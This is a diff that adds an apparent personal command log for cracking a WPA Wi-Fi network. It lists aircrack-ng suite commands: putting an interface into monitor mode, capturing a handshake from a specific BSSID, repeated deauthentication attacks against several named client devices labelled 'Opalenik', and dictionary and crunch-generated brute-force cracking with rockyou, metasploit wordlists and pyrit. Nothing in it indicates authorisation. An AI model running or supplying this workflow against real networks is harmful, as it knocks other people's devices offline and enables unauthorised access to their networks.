@@ -1,0 +1,38 @@
+aircrack-ng -w /usr/share/wordlists/metasploit/adobe_top100_pass.txt /home/kali/my/caps-01.cap
+
+aircrack-ng -w /home/kali/rockyou.txt /home/kali/opalenik/caps-01.cap
+
+
+
+airmon-ng start wlan0
+airmon-ng check kill
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c 1 --bssid 90:F6:52:77:4B:B4 -w caps
+aireplay-ng wlan0mon -0 5 -a 90:F6:52:77:4B:B4 -c C0:CE:CD:15:A1:7C   /// Opalenik 
+aireplay-ng wlan0mon -0 5 -a 90:F6:52:77:4B:B4 -c 04:4B:ED:5B:86:2B   /// Opalenik 2
+aireplay-ng wlan0mon -0 5 -a 90:F6:52:77:4B:B4 -c B8:7B:C5:90:D1:33   /// Opalenik  3
+aireplay-ng wlan0mon -0 5 -a 90:F6:52:77:4B:B4 -c 8C:0D:76:92:46:6E   /// Opalenik   4
+aireplay-ng wlan0mon -0 5 -a 90:F6:52:77:4B:B4 -c C0:CE:CD:15:A1:7C   /// Opalenik   5
+aircrack-ng -w /usr/share/wordlists/metasploit/burnett_top_500.txt caps-01.cap 
+aireplay-ng wlan0mon -0 5 -a 4F:B1:A4:05:5C:21 -c C0:CE:CD:15:A1:7C   /// Opalenik 
+
+aireplay-ng wlan0mon -0 5 -a 64:EE:B7:17:85:38 -c 5B:23:15:00:C8:57
+
+aircrack-ng -w /usr/share/wordlists/metasploit/wp-plugins.txt caps-01.cap
+
+crunch 10 10 -t 063%%%%%%% |aircrack-ng -w /home/kali/oldcap/caps-01.cap
+
+crunch 10 10 -t 050%%%%%%% |aircrack-ng -w /home/kali/oldcap/caps-01.cap
+
+crunch 8 10 0123456789 |
+
+crunch 8 10 0123456789 | pyrit -r caps.cap -e MYNET -i - attack_passthrough
+
+aireplay-ng wlan0mon -0 5 -a 90:F6:52:77:4B:B4 -c C0:CE:CD:15:A1:7C
+http://anandam.name/pbkdf2/
+https://crypto.stackexchange.com/questions/3484/pbkdf2-and-salt/3487
+https://habr.com/en/post/225059/
+
+
+
+
